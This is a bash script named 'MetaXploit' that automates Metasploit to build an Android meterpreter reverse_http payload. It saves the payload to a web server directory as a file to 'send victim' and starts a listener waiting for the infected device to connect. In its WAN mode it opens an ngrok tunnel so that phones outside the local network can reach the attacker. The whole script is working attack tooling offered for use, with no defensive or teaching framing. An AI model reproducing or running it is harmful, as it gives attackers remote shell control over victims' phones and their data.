#!/bin/bash
#pre-requisites
ip=$(ifconfig | grep inet | grep -v "inet6\|127.0.0.1" | awk '{print $2}' )
interface=$(route -n | grep "UG" | awk '{print $8}')
local_ip=$(ifconfig | grep inet | grep -v "inet6\|broadcast" | awk '{print $2}')

echo "welcome to MetaXploit"
echo "select type: 1)Local  2)WAN"
read a
systemctl restart postgresql
if [[ $a == "1" ]]
then
       echo "running Interface: $interface"
       echo -n "name of interface you want to select(Wlan0/Eth0) : "
       read b
       if [[ $b == "Wlan0" ]]
       then
                echo "internal ip: $ip"
        	echo -n "set LPORT (default:4444) : "
        	read lport
        	if [[ ! -z "$lport" ]]
        	then
          		echo"LPORT : $lport"
                else
	        	lport=4444
              	fi
		echo -n "name of the file to send victim : "
		read name
        	echo "use payload/android/meterpreter/reverse_http
		      set lhost $ip
		      set lport $lport
		      generate -f raw -o /var/www/html/$name
		      use exploit/multi/handler
                      set payload android/meterpreter/reverse_http
                      set lhost $ip
                      set lport $lport
                      exploit" > local_exploit.rc
		msfconsole -r local_exploit.rc
	
	else
		echo "wrong input!"
        fi
elif [[ $a == "2" ]]
then

	cd /root/Downloads/ngrok-stable-linux-amd64
        ./ngrok start --all > /dev/null & 
       	curl http://127.0.0.1:4040/api/tunnels | jq ".tunnels[1].public_url" > xxx

	ngo=$(cat xxx | cut -d'"' -f2 | cut -d'/' -f3)
	echo "$ngo"
	cd /root/Desktop/MetaXploit
	echo -n "name of the file to send victim : "
	read name
       	echo "use payload/android/meterpreter/reverse_http
              set lhost $ngo
	      set lport 80
	      generate -f raw -o /var/www/html/$name
	      use exploit/multi/handler
              set payload android/meterpreter/reverse_http
              set lhost $local_ip
              set lport 8080
	      exploit" > WAN_exploit.rc
	msfconsole -r WAN_exploit.rc
        	


else
        RED='\033[0;31m'
        NC='\033[0m'	
	echo -e "${RED}wrong input! please try again.${NC}"
fi
